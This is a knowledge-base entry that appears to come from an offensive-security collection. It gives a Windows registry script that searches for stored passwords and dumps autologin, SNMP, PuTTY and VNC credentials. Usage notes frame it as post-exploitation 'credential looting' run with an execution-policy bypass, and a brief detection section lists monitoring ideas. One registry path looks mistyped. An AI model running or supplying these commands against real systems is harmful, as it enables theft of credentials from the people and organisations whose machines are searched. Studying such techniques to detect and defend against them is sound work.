---
type: code
language: powershell
verified: true
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Windows
tags:
  - credential-dump
  - registry-search
  - powershell
validated: true
---

# powershell-windows-registry-credential-search-script

## Code

```powershell
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

## Description

This PowerShell script automates multiple registry queries to search for passwords and credentials across HKLM and HKCU, including autologin, SNMP, PuTTY, and VNC keys. It combines broad searches with targeted dumps for efficient credential looting.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | No variables; fixed script | N/A |

## Usage

Save as `reg_creds.ps1` and run in PowerShell with admin rights: `powershell -ExecutionPolicy Bypass -File reg_creds.ps1 > output.txt`. Review output for plaintext credentials. Used in post-exploitation for Windows systems to recover local or service creds.

## Detection

- Monitor PowerShell execution logs for reg query invocations
- Audit registry access to sensitive keys (Winlogon, SNMP, PuTTY)
- EDR alerts on multiple reg queries in short succession
- Process monitoring: powershell.exe spawning cmd.exe for reg

## Related

- [[procedures/windows-password-and-credential-query-via-registry]]
